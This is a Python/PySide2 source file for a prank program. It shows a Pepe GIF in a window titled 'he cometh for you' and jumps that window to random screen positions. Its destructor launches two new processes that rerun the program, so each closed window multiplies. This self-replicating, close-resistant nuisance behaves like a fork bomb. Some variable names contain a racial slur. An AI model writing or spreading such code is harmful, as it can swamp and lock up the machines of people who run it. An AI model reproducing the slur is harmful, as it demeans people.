import random
import multiprocessing
import sys
import uuid

from PySide2 import QtCore, QtGui, QtWidgets

ASSET_NAME = 'assets/word_pepe.gif'


class WindowBoi(QtWidgets.QWidget):

    def __init__(self):
        super().__init__()
        self.label_nigga = None
        self.layout_boi = None
        self.image_boi = None
        self.boyo = None
        self.movie = None
        self.timer = QtCore.QTimer()
        self.init_ui()
        self.timer.timeout.connect(self.goto)
        self.timer.start(500)

    def goto(self):
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        xx = self.x()
        yy = self.y()
        step = 1000
        for i in range(0, step):
            self.move(xx, yy)
            xmod = 1 if x >= xx else -1
            ymod = 1 if y >= yy else -1
            xx += (x / step) * xmod
            yy += (y / step) * ymod

    def init_ui(self):
        self.setWindowTitle('he cometh for you')
        self.setGeometry(200, 200, 100, 100)
        self.setFixedSize(200, 200)
        self.setWindowFlags(QtCore.Qt.WindowCloseButtonHint)
        self.layout_boi = QtWidgets.QHBoxLayout()
        try:
            asset_location = f'{sys._MEIPASS}/{ASSET_NAME}'
        except Exception as ex:
            asset_location = ASSET_NAME
        self.movie = QtGui.QMovie(asset_location)
        self.label_nigga = QtWidgets.QLabel()
        self.label_nigga.setMovie(self.movie)
        self.layout_boi.addWidget(self.label_nigga)
        self.movie.start()
        self.setLayout(self.layout_boi)
        self.show()

    def __del__(self):
        name1 = str(uuid.uuid4())
        name2 = str(uuid.uuid4())
        p1 = multiprocessing.Process(target=main, daemon=False, name=name1)
        p2 = multiprocessing.Process(target=main, daemon=False, name=name2)
        p1.start()
        p2.start()


def main():
    app = QtWidgets.QApplication(sys.argv)
    window = WindowBoi()
    window.show()
    sys.exit(app.exec_())
